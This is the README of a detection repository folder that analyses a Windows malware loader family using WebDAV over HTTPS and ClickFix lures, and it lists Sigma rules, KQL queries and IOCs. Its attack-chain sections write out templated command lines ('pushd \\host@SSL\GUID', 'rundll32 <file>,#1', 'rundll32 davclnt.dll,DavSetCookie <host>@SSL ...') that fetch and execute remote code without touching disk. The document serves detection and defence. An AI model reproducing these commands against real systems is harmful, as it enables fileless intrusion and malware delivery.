# webdav-over-ssl-loader-family

Blog post: https://blueteam.cool/posts/webdav-over-ssl-loader-family/

## Summary

Seven incidents across roughly four weeks (25 June - 21 July 2026) that all
resolve to the same Windows primitive: appending `@SSL` (optionally
`@SSL@443`) to a WebDAV hostname makes the WebClient service mount the share
over HTTPS instead of SMB, and `rundll32 <file>,#1` then executes a remote
DLL by ordinal with nothing written to disk. Six of the seven incidents share
one interchangeable loader with rotating parts (launcher, payload filename,
delivery mechanism); the seventh reaches the same `@SSL` transport through a
different Microsoft binary (`davclnt.dll,DavSetCookie`) and drops five RATs
at once.

Attack chain (six of seven incidents):
```
Fake "verify you are human" ClickFix page
  -> victim pastes command into Win+R and hits Enter
  -> hidden LOLBin launcher (WMI / forfiles / conhost --headless / pcalua)
  -> delivery stage fetches or decodes the pushd command
     (jsDelivr cache-after-delete, or an EtherHiding smart-contract read)
  -> pushd \\host@SSL\GUID mounts WebDAV over HTTPS (443, not SMB 445)
  -> rundll32 <file>,#1 executes the remote DLL by ordinal, no disk write
  -> multi-layer native unpacker decrypts the real payload in memory
  -> info-stealer/RAT-class implant (unconfirmed past this point for most)
```

Sibling chain (incident 7 -- SERPENTINE#CLOUD):
```
rundll32.exe davclnt.dll,DavSetCookie <host>@SSL <https-url>/*.wsf
  -> .wsf over an ephemeral Cloudflare Quick Tunnel
  -> embedded Python, Kramer-obfuscated .pyc, Donut shellcode
  -> VenomRAT + AsyncRAT + XWorm/Violet + PureHVNC + Brute Ratel C4
```

Incident 4 (`betwanaa[.]com` / `boroo[.]bet`, EtherHiding) already has its own
full forensic-grade write-up and revalidation in
[`campaigns/betwanaa-boroo-webdav-etherhiding/`](../betwanaa-boroo-webdav-etherhiding/) --
this folder cross-references it rather than duplicating that dataset.

## What is included

| File | Description |
|------|-------------|
| `iocs.csv` | Consolidated IOC table across all seven incidents -- hashes, filenames, exports, delivery GUIDs/hosts/apexes, EtherHiding contracts/wallets/selectors, SERPENTINE#CLOUD C2, staging accounts |
| `sigma-webdav-ssl-rundll32-ordinal.yml` | Core `pushd \\...@SSL\GUID` + `rundll32 <file>,#1` detection |
| `sigma-lolbin-proxy-webdav-ssl-launcher.yml` | LOLBin launcher (WMI/forfiles/conhost/pcalua) proxying the delayed-expansion `cmd` reassembly |
| `sigma-davclnt-webdav-fetch.yml` | `rundll32 davclnt.dll,DavSetCookie` sibling delivery -- near-zero false positives |
| `kql.md` | Sentinel / Defender XDR queries for all of the above plus WebClient service state, Script Block Logging, RunMRU, blockchain RPC egress, and SERPENTINE#CLOUD C2 pivots |
| `README.md` | This file |

## Coverage notes

**What these detections cover:**
- The `pushd \\host@SSL\GUID` + `rundll32 <file>,#1` pattern across all six
  loader-family incidents, independent of which LOLBin proxies the launch.
- The `davclnt.dll,DavSetCookie` sibling delivery mechanism.
- WebClient service activation as an early-warning signal.
- The PowerShell/jsDelivr delivery cradle (incidents 1-2) via Script Block
  Logging.
- Outbound beaconing to the shared BSC-testnet RPC used by the EtherHiding
  variants (incidents 4-5).
- SERPENTINE#CLOUD's confirmed DuckDNS C2 infrastructure (incident 7).

**What they do NOT cover:**
- The final payload's actual capability. Static analysis on the
  incident-5 `gc.key` build got through two of three native unpacking
  layers before hitting a wall that needs a fully PE-mapped process to
  resolve -- classed as "infostealer- or RAT-class" by shape only, not
  confirmed. The incident-3 and incident-6 (`goog.ct`) payloads were never
  recovered as bytes at all; their delivery subdomains were torn down
  within minutes of the live incident.
- Full detail on the incident-4 EtherHiding infrastructure -- see the
  linked `betwanaa-boroo-webdav-etherhiding` folder for that.
- Independent RIPE/ipinfo/Shodan cross-validation of the SERPENTINE#CLOUD
  `12.202.176.0/21` (AS7018) IP block -- noted as medium confidence in
  `iocs.csv` pending that follow-up.
- Any future rotated delivery domain not yet observed. Every WebDAV
  subdomain in this family has proven ephemeral (dead within minutes of a
  live incident), so treat host-level IOCs as pivots, not durable
  blocklist entries.

## False-positive notes

- `sigma-webdav-ssl-rundll32-ordinal.yml` and
  `sigma-lolbin-proxy-webdav-ssl-launcher.yml`: essentially none in
  production. `@SSL` UNC paths combined with `rundll32 ...,#1` or a
  LOLBin-proxied delayed-expansion `cmd` have no known legitimate use.
  Legitimate WebDAV automation on a small subset of workstations is the
  only plausible source of noise -- baseline before deploying at `level:
  high`/`critical`.
- `sigma-davclnt-webdav-fetch.yml`: near-zero false positives -- alert
  outright.
- The `filename:pf.ch` urlscan pivot (referenced in the blog post, not a
  Sigma rule here) has known false positives against legitimate Swiss
  `.ch` sites ending in `-pf.ch`. Exclude those apexes before treating a
  hit as a campaign indicator.
- The blockchain-RPC egress query (KQL section 6) will also match
  legitimate Web3/DeFi tooling on developer workstations. See the linked
  `betwanaa-boroo-webdav-etherhiding` folder's false-positive notes for
  the verification method used to separate campaign traffic from
  unrelated RPC use.

## Confidence

High confidence on the loader mechanics across all six `pushd`/`rundll32`
incidents (command lines, delivery GUIDs, and static fingerprints directly
observed) and on the `davclnt.dll,DavSetCookie` sibling chain down to the
RAT family level. Medium confidence on the fleet-wide EtherHiding domain
lists for incidents 4-5 (many entries observed once, not independently
re-verified this pass) and on the SERPENTINE#CLOUD `/21` IP block
attribution (not cross-validated against RIPE/ipinfo/Shodan). Unknown on
the final payload capability for `pf.ch`/`gc.key`/`goog.ct` -- no bytes
recovered past the native-unpacking stage for any of them.

## Related detections

- `iocs.csv`
- `sigma-webdav-ssl-rundll32-ordinal.yml`
- `sigma-lolbin-proxy-webdav-ssl-launcher.yml`
- `sigma-davclnt-webdav-fetch.yml`
- `kql.md`
- [`campaigns/betwanaa-boroo-webdav-etherhiding/`](../betwanaa-boroo-webdav-etherhiding/) -- incident 4 deep dive
